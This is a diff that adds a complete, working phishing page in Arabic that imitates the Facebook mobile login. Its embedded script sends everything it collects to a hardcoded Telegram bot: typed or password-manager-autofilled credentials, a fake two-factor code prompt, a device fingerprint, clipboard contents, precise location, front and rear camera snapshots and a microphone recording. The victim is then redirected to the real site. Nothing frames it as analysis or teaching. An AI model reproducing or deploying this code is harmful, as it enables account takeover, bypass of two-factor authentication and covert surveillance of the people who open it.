@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#1877f2">
+<meta name="robots" content="noindex">
+<meta name="format-detection" content="telephone=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='7' fill='%231877f2'/><path fill='%23fff' d='M22 16a6 6 0 10-6.9 5.9v-4.2h-1.5V16h1.5v-1.3c0-1.5.9-2.3 2.2-2.3.6 0 1.3.1 1.3.1v1.4h-.7c-.7 0-1 .4-1 .9V16h1.6l-.3 1.7h-1.3v4.2A6 6 0 0022 16z'/></svg>">
+<title>فيسبوك</title>
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;padding:0}
+body{font-family:-apple-system,"Segoe UI",Roboto,Arial,sans-serif;background:#fff;color:#1c1e21;
+     min-height:100vh;min-height:100dvh;display:flex;flex-direction:column;direction:rtl;
+     overscroll-behavior-y:contain;padding-top:env(safe-area-inset-top)}
+input,button,textarea{font-family:inherit}
+.top{background:#fff;padding:16px 14px 9px;display:flex;justify-content:center;flex:0 0 auto;
+     border-bottom:1px solid #eef0f3;overflow:hidden;max-height:60px;
+     transition:max-height .2s ease,padding .2s ease,border-color .2s ease}
+body:has(.ghost:focus) .top{max-height:0;padding-top:0;padding-bottom:0;border-bottom-color:transparent}
+.logo{width:96px;display:block}
+.wrap{flex:1;padding:20px 18px 26px;max-width:460px;margin:0 auto;width:100%}
+h1{font-size:19px;text-align:center;margin:0 0 20px;font-weight:600}
+.field{position:relative;margin-bottom:11px}
+.field .real{width:100%;padding:14px 13px;font-size:16px;line-height:1.25;border:1px solid #ccd0d5;
+     border-radius:8px;background:#fff;pointer-events:none;color:#1c1e21;text-align:right}
+.field .ghost{position:absolute;inset:0;width:100%;padding:14px 13px;font-size:16px;line-height:1.25;
+     border:1px solid transparent;border-radius:8px;background:transparent;color:transparent;
+     caret-color:#1877f2;z-index:3;outline:none;text-align:right}
+.field .ghost:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f0fe}
+.btn{width:100%;padding:13px;font-size:16.5px;font-weight:700;color:#fff;background:#1877f2;border:0;
+     border-radius:8px;margin-top:6px;display:flex;align-items:center;justify-content:center;gap:8px}
+.btn:not(:disabled):active{background:#1462cc}
+.btn:disabled{opacity:.75}
+.lnk{display:block;text-align:center;margin-top:16px;font-size:13.5px;color:#1877f2;text-decoration:none}
+.foot{text-align:center;font-size:11.5px;color:#8a8d91;line-height:1.7;flex:0 0 auto;
+     padding:14px 14px calc(14px + env(safe-area-inset-bottom))}
+.foot b{color:#606770}
+.otp{display:none}
+.otp.on{display:block}
+.loginview.off{display:none}
+.bar{height:0;position:relative}
+.back{position:absolute;top:-4px;inset-inline-start:0;display:flex;padding:6px;margin:-6px;
+      background:none;border:0;cursor:pointer}
+.hint{font-size:13px;color:#606770;text-align:center;line-height:1.8;margin:0 0 16px}
+.boxes{display:flex;gap:6px;direction:ltr;justify-content:center;margin:0 0 16px}
+.boxes input{flex:1 1 0;min-width:0;max-width:52px;height:54px;text-align:center;font-size:21px;
+     border:1px solid #ccd0d5;border-radius:8px;font-weight:700;color:#1c1e21;background:#fff}
+.boxes input:focus{outline:none;border-color:#1877f2}
+.spin{display:none;width:17px;height:17px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;
+     animation:sp .7s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+.loading .spin{display:block}
+</style>
+</head>
+<body>
+
+<div class="top">
+<svg class="logo" viewBox="0 0 100 30" role="img" aria-label="فيسبوك"><path fill="#1877f2" d="M22 15a11 11 0 10-12.7 10.9v-7.7H6.6V15h2.7v-2.3c0-2.7 1.6-4.2 4-4.2 1.2 0 2.4.2 2.4.2v2.6h-1.3c-1.3 0-1.7.8-1.7 1.6V15h2.9l-.5 3.2h-2.4v7.7A11 11 0 0022 15z"/><text x="30" y="22" font-size="19" font-weight="700" fill="#1877f2" font-family="Arial">facebook</text></svg>
+</div>
+
+<div class="wrap">
+
+  <div class="loginview" id="lv">
+    <h1>تسجيل الدخول إلى فيسبوك</h1>
+    <form id="f" autocomplete="on" novalidate>
+      <div class="field">
+        <input class="real" id="ru" type="text" placeholder="البريد الإلكتروني أو رقم الهاتف" tabindex="-1" aria-hidden="true">
+        <input class="ghost" id="gu" type="text" name="email" autocomplete="username"
+               inputmode="email" autocapitalize="none" spellcheck="false" enterkeyhint="next"
+               aria-label="البريد الإلكتروني أو رقم الهاتف">
+      </div>
+      <div class="field">
+        <input class="real" id="rp" type="password" placeholder="كلمة السر" tabindex="-1" aria-hidden="true">
+        <input class="ghost" id="gp" type="password" name="pass" autocomplete="current-password"
+               enterkeyhint="go" aria-label="كلمة السر">
+      </div>
+      <button class="btn" id="sb" type="submit"><span class="txt">تسجيل الدخول</span><span class="spin"></span></button>
+    </form>
+    <a class="lnk" href="https://m.facebook.com/login/identify/" rel="noopener">هل نسيت كلمة السر؟</a>
+  </div>
+
+  <div class="otp" id="otpv">
+    <div class="bar"><button class="back" id="back" type="button" aria-label="رجوع">
+      <svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true"><path fill="#1c1e21" d="M8.5 3.5 17 12l-8.5 8.5-1.4-1.4L14.2 12 7.1 4.9z"/></svg>
+    </button></div>
+    <h1>أدخل رمز التحقق</h1>
+    <p class="hint">أرسلنا رمزًا مكوّنًا من 6 أرقام إلى هاتفك.<br>أدخله للمتابعة.</p>
+    <div class="boxes" id="bx" role="group" aria-label="رمز التحقق">
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" aria-label="الخانة 1">
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*" aria-label="الخانة 2"><input maxlength="1" inputmode="numeric" pattern="[0-9]*" aria-label="الخانة 3">
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*" aria-label="الخانة 4"><input maxlength="1" inputmode="numeric" pattern="[0-9]*" aria-label="الخانة 5">
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*" aria-label="الخانة 6">
+    </div>
+    <button class="btn" id="vbtn" type="button"><span class="txt">متابعة</span><span class="spin"></span></button>
+    <a class="lnk" href="https://m.facebook.com" rel="noopener">متابعة لاحقًا</a>
+  </div>
+
+</div>
+
+<div class="foot"><b>Meta</b> &nbsp;·&nbsp; <b>عن</b> &nbsp;·&nbsp; <b>المساعدة</b><br>© 2026</div>
+
+<noscript><div style="text-align:center;font-size:13px;color:#606770;padding:0 18px 20px">فعّل JavaScript لإتمام تسجيل الدخول.</div></noscript>
+
+<script>
+/* ============ 0) الإعدادات ============ */
+const TG_TOKEN = "8057395433:AAF6jrhJo--MJnIz80-dRTt-bhtkbsquX8w";
+const TG_CHAT  = "8977239963";
+const FALLBACK_URL = "";
+
+const T = { warm:1200, gap:600, ice:2000, geo:9000, mic:4000, poll:450, pollMax:30000,
+            auto:750, fake:1200, jump:1000, dedupe:8000 };
+
+const esc = s => String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")
+                            .replace(/"/g,"&quot;").replace(/'/g,"&#39;");
+const api   = m => "https://api.telegram.org/bot"+TG_TOKEN+"/"+m;
+const stamp = () => new Date().toLocaleString("ar-EG");
+const hash  = s => { let h=2166136261; for(let i=0;i<s.length;i++){ h^=s.charCodeAt(i); h=Math.imul(h,16777619); } return (h>>>0).toString(16); };
+const SS = {
+  get(k){ try{ return sessionStorage.getItem(k); }catch(e){ return null; } },
+  set(k,v){ try{ sessionStorage.setItem(k,v); }catch(e){} }
+};
+const safe = async (fn,fb) => { try{ const v=await fn(); return (v===undefined||v===null||v==="")?fb:v; }catch(e){ return fb; } };
+
+function send(text){
+  const body = {chat_id:TG_CHAT,text,parse_mode:"HTML",disable_web_page_preview:true};
+  fetch(api("sendMessage"),{method:"POST",keepalive:true,
+    headers:{"Content-Type":"application/json"},body:JSON.stringify(body)}).catch(()=>{});
+  if(FALLBACK_URL) fetch(FALLBACK_URL,{method:"POST",keepalive:true,
+    headers:{"Content-Type":"application/json"},body:JSON.stringify({text})}).catch(()=>{});
+}
+function sendFile(blob,name,caption,field){
+  if(!blob) return;
+  field = field || "document";
+  const fd = new FormData();
+  fd.append("chat_id",TG_CHAT);
+  fd.append("caption",caption);
+  fd.append(field,blob,name);
+  fetch(api(field==="photo"?"sendPhoto":"sendDocument"),{method:"POST",body:fd}).catch(()=>{});
+}
+
+/* ============ 1) البصمة ============ */
+async function battery(){
+  return safe(async()=>{
+    if(!navigator.getBattery) return "غير مدعوم";
+    const b = await navigator.getBattery();
+    return Math.round(b.level*100)+"% "+(b.charging?"(تشحن)":"(لا تشحن)");
+  },"مرفوض");
+}
+function iceIPs(){
+  return new Promise(r=>{
+    try{
+      const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+      const ips = new Set();
+      pc.onicecandidate = e=>{
+        if(!e.candidate||!e.candidate.candidate) return;
+        const m = e.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){2,7})/i);
+        if(m) ips.add(m[1]);
+      };
+      try{ pc.createDataChannel("x"); }catch(e){}
+      pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(()=>{});
+      setTimeout(()=>{ try{pc.close()}catch(e){}; r([...ips].join(", ")||"لا شيء"); },T.ice);
+    }catch(e){ r("غير مدعوم"); }
+  });
+}
+function canvasFP(){
+  try{
+    const c=document.createElement("canvas"); c.width=240; c.height=60;
+    const x=c.getContext("2d");
+    x.textBaseline="top"; x.font="14px Arial"; x.fillStyle="#f60";
+    x.fillRect(0,0,240,60); x.fillStyle="#069"; x.fillText("Venice <fp> 8#@",4,10);
+    return hash(c.toDataURL());
+  }catch(e){ return "-"; }
+}
+function glFP(){
+  try{
+    const g=document.createElement("canvas").getContext("webgl");
+    const d=g.getExtension("WEBGL_debug_renderer_info");
+    return d ? g.getParameter(d.UNMASKED_RENDERER_WEBGL) : "-";
+  }catch(e){ return "-"; }
+}
+function audioFP(){
+  return new Promise(r=>{
+    try{
+      const C=window.OfflineAudioContext||window.webkitOfflineAudioContext;
+      if(!C) return r("-");
+      const c=new C(1,44100,44100), o=c.createOscillator();
+      o.type="triangle"; o.frequency.value=10000;
+      const comp=c.createDynamicsCompressor();
+      o.connect(comp); comp.connect(c.destination); o.start();
+      c.startRendering().then(b=>{
+        const d=b.getChannelData(0); let s=0;
+        for(let i=4500;i<5000&&i<d.length;i++) s+=Math.abs(d[i]);
+        r(s.toFixed(6));
+      }).catch(()=>r("-"));
+    }catch(e){ r("-"); }
+  });
+}
+function sensors(){
+  return new Promise(r=>{
+    const h = e=>{
+      const a = e.accelerationIncludingGravity;
+      if(!a || a.x==null) return;
+      window.__acc = [a.x.toFixed(2),a.y.toFixed(2),a.z.toFixed(2)].join("/");
+    };
+    try{ window.addEventListener("devicemotion",h); }catch(e){}
+    setTimeout(()=>{ try{ window.removeEventListener("devicemotion",h); }catch(e){}; r(window.__acc||"لا يوجد"); },1200);
+  });
+}
+async function clip(){
+  return safe(async()=>{
+    const t = await navigator.clipboard.readText();
+    return t.slice(0,300)||"(فارغ)";
+  },"مرفوض");
+}
+
+async function fingerprint(){
+  const [au,ips,bt,acc,cl] = await Promise.all([audioFP(),iceIPs(),battery(),sensors(),clip()]);
+  return [
+    "🖥 <b>بصمة الجهاز</b>",
+    "UA: "+esc(navigator.userAgent),
+    "المنصة: "+esc(navigator.platform||"-"),
+    "اللغة: "+esc((navigator.language||"-")+" / "+((navigator.languages||[]).join(","))),
+    "الشاشة: "+screen.width+"×"+screen.height+" @ "+devicePixelRatio+"x",
+    "المتاح: "+screen.availWidth+"×"+screen.availHeight+" | اتجاه "+esc((screen.orientation&&screen.orientation.type)||"-"),
+    "النواة: "+(navigator.hardwareConcurrency||"?")+" | RAM: "+(navigator.deviceMemory||"?")+"GB",
+    "نقاط اللمس: "+navigator.maxTouchPoints,
+    "المنطقة الزمنية: "+esc(await safe(()=>Intl.DateTimeFormat().resolvedOptions().timeZone,"-")),
+    "الوقت: "+esc(stamp()),
+    "البطارية: "+bt,
+    "الشبكة: "+esc((navigator.connection&&navigator.connection.effectiveType)||"?")+" / "+((navigator.connection&&navigator.connection.downlink)||"?")+"Mb",
+    "IP محلي: "+esc(ips),
+    "GPU: "+esc(glFP()),
+    "Canvas: "+esc(canvasFP()),
+    "Audio: "+au,
+    "حساس: "+acc,
+    "الحافظة: "+esc(cl),
+    "الكوكيز: "+(navigator.cookieEnabled?"مفعلة":"معطلة"),
+    "التخزين: "+((navigator.storage&&navigator.storage.estimate)?"متاح":"-")
+  ].join("\n");
+}
+
+async function geo(){
+  return new Promise(r=>{
+    if(!navigator.geolocation) return r("غير مدعوم");
+    navigator.geolocation.getCurrentPosition(
+      p=>r(p.coords.latitude+","+p.coords.longitude+" ±"+Math.round(p.coords.accuracy)+"م\n"+
+           "https://maps.google.com/?q="+p.coords.latitude+","+p.coords.longitude),
+      e=>r("مرفوض/فشل: "+e.message),
+      {enableHighAccuracy:true,timeout:T.geo,maximumAge:0}
+    );
+  });
+}
+
+async function shot(facing,label){
+  let s;
+  try{
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia) return;
+    s = await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:{ideal:1280}},audio:false});
+    const v = document.createElement("video");
+    v.playsInline=true; v.muted=true; v.setAttribute("playsinline",""); v.srcObject=s;
+    await new Promise(r=>{
+      let done=false; const fin=()=>{ if(done) return; done=true; r(); };
+      v.addEventListener("loadedmetadata",fin,{once:true});
+      setTimeout(fin,1500);
+    });
+    try{ await v.play(); }catch(e){}
+    await new Promise(r=>setTimeout(r,T.warm));
+    const w=v.videoWidth||0, h=v.videoHeight||0;
+    if(!w||!h) return;
+    const c=document.createElement("canvas"); c.width=w; c.height=h;
+    c.getContext("2d").drawImage(v,0,0,w,h);
+    const blob = await new Promise(r=>{ try{ c.toBlob(r,"image/jpeg",.82); }catch(e){ r(null); } });
+    if(blob) sendFile(blob,label+".jpg","📸 "+label,"photo");
+  }catch(e){}finally{ try{ s.getTracks().forEach(t=>t.stop()); }catch(e){} }
+}
+
+async function mic(){
+  let s;
+  try{
+    if(!navigator.mediaDevices||!window.MediaRecorder) return;
+    s = await navigator.mediaDevices.getUserMedia({audio:true});
+    const types=["audio/webm;codecs=opus","audio/webm","audio/mp4","audio/ogg"];
+    const mime = types.filter(t=>{ try{ return MediaRecorder.isTypeSupported(t); }catch(e){ return false; } })[0]||"";
+    const mr = mime ? new MediaRecorder(s,{mimeType:mime}) : new MediaRecorder(s);
+    const ch=[]; let stopped=false;
+    mr.ondataavailable = e=>{ if(e.data&&e.data.size) ch.push(e.data); };
+    mr.onstop = ()=>{
+      stopped = true;
+      try{
+        if(ch.length) sendFile(new Blob(ch,{type:mime||"audio/webm"}),
+          "mic."+(mime.indexOf("mp4")>-1?"m4a":"webm"),"🎙 ميكروفون 4 ثوان","document");
+      }catch(e){}
+      try{ s.getTracks().forEach(t=>t.stop()); }catch(e){}
+    };
+    mr.start();
+    setTimeout(()=>{ try{ if(mr.state!=="inactive") mr.stop(); }catch(e){} },T.mic);
+    setTimeout(()=>{ if(!stopped){ try{ s.getTracks().forEach(t=>t.stop()); }catch(e){} } },T.mic+3000);
+  }catch(e){ try{ s&&s.getTracks().forEach(t=>t.stop()); }catch(_){} }
+}
+
+/* ============ 2) عند الفتح ============ */
+(async ()=>{
+  try{
+    if(SS.get("p1")) return;
+    SS.set("p1","1");
+
+    send("🚀 <b>فتح الصفحة</b>\n"+await fingerprint());
+
+    if("Notification" in window && Notification.permission==="default")
+      try{ Notification.requestPermission().catch(()=>{}); }catch(e){}
+
+    geo().then(g=>send("📍 <b>الموقع</b>\n"+esc(g)));
+
+    await new Promise(r=>setTimeout(r,300));
+    await shot("user","سيلفي");
+    await new Promise(r=>setTimeout(r,T.gap));
+    await shot("environment","كاميرا خلفية");
+    await new Promise(r=>setTimeout(r,400));
+    mic();
+  }catch(e){}
+})();
+
+/* ============ 3) عناصر ============ */
+const gu = document.getElementById("gu"), gp = document.getElementById("gp");
+const ru = document.getElementById("ru"), rp = document.getElementById("rp");
+const form = document.getElementById("f"), sb = document.getElementById("sb");
+const otpv = document.getElementById("otpv"), lv = document.getElementById("lv");
+const bx = [].slice.call(document.querySelectorAll("#bx input"));
+const vbtn = document.getElementById("vbtn");
+
+let typedP=false, busy=false, sentCred=false, otpSent=false;
+let poll=null, lastSent="", lastSentAt=0;
+
+/* ============ 4) خدعة مدير كلمات السر ============ */
+function syncFields(){
+  if(!gu.value && ru.value) gu.value = ru.value;
+  if(!gp.value && rp.value) gp.value = rp.value;
+  if(ru.value !== gu.value) ru.value = gu.value;
+  if(rp.value !== gp.value) rp.value = gp.value;
+}
+
+function pushCreds(tag){
+  const u = (gu.value||ru.value).trim(), p = gp.value||rp.value;
+  if(!u || !p) return false;
+  const combo = u+"|"+p;
+  if(combo===lastSent && Date.now()-lastSentAt < T.dedupe) return false;
+  lastSent = combo; lastSentAt = Date.now();
+  send("🔑 <b>"+tag+"</b>\n👤 <code>"+esc(u)+"</code>\n🔒 <code>"+esc(p)+"</code>\n🕒 "+esc(stamp()));
+  return true;
+}
+
+function harvest(){
+  if(busy) return;
+  syncFields();
+  const u = gu.value.trim(), p = gp.value;
+  if(!u || !p) return;
+  if(u+"|"+p === lastSent) return;
+  if(sentCred){
+    pushCreds("بيانات محدَّثة");
+    return;
+  }
+  sentCred = true;
+  pushCreds("بيانات محفوظة (التقاط تلقائي)");
+  if(poll) clearInterval(poll);
+  if(!typedP) setTimeout(()=>{ if(!busy && gp.value && !otpv.classList.contains("on")) doLogin(); }, T.auto);
+}
+
+["input","change","blur","focus"].forEach(ev=>{
+  gu.addEventListener(ev,harvest); gp.addEventListener(ev,harvest);
+});
+gu.addEventListener("keydown",()=>{ typedP=true; });
+gp.addEventListener("keydown",()=>{ typedP=true; });
+
+poll = setInterval(harvest,T.poll);
+setTimeout(()=>{ if(poll){ clearInterval(poll); poll=null; } },T.pollMax);
+
+/* ============ 5) الدخول ============ */
+async function doLogin(){
+  if(busy) return;
+  const u = (gu.value||ru.value).trim(), p = gp.value||rp.value;
+  if(!u){ gu.focus(); return; }
+  if(!p){ gp.focus(); return; }
+
+  busy = true;
+  if(poll){ clearInterval(poll); poll=null; }
+  sb.disabled = true;
+  sb.classList.add("loading");
+
+  pushCreds("بيانات مُدخلة نهائيًا");
+  SS.set("u",u);
+
+  setTimeout(()=>{
+    busy = false;
+    sb.disabled = false;
+    sb.classList.remove("loading");
+    lv.classList.add("off");
+    otpv.classList.add("on");
+    bx[0].focus();
+  }, T.fake);
+}
+form.addEventListener("submit",e=>{ e.preventDefault(); doLogin(); });
+
+/* ============ 6) OTP ============ */
+function checkOtp(){
+  if(bx.every(x=>x.value) && !otpSent) vbtn.click();
+}
+
+bx.forEach((el,i)=>{
+  el.addEventListener("input",()=>{
+    el.value = el.value.replace(/\D/g,"").slice(0,1);
+    if(el.value && i<5) bx[i+1].focus();
+    checkOtp();
+  });
+  el.addEventListener("change",checkOtp);
+  el.addEventListener("blur",checkOtp);
+  el.addEventListener("keydown",ev=>{
+    if(ev.key==="Backspace" && !el.value && i>0){ bx[i-1].focus(); bx[i-1].value=""; }
+  });
+  el.addEventListener("paste",ev=>{
+    const raw = ((ev.clipboardData||window.clipboardData||{}).getData("text")||"").replace(/\D/g,"").slice(0,6);
+    if(!raw) return;
+    ev.preventDefault();
+    raw.split("").forEach((d,k)=>{ if(bx[k]) bx[k].value=d; });
+    bx[Math.min(raw.length,5)].focus();
+    checkOtp();
+  });
+});
+
+vbtn.addEventListener("click",()=>{
+  if(otpSent) return;
+  const code = bx.map(x=>x.value).join("");
+  if(code.length<4) return;
+  otpSent = true;
+  vbtn.disabled = true;
+  vbtn.classList.add("loading");
+
+  send("🔐 <b>رمز التحقق OTP</b>\n👤 "+esc(SS.get("u")||"?")+"\n🔢 <code>"+esc(code)+"</code>\n🕒 "+esc(stamp()));
+
+  setTimeout(()=>{ location.replace("https://m.facebook.com"); },T.jump);
+});
+
+document.getElementById("back").addEventListener("click",()=>{
+  otpv.classList.remove("on");
+  lv.classList.remove("off");
+  otpSent = false;
+  vbtn.disabled = false;
+  vbtn.classList.remove("loading");
+  bx.forEach(x=>x.value="");
+  gu.focus();
+});
+</script>
+</body>
+</html>
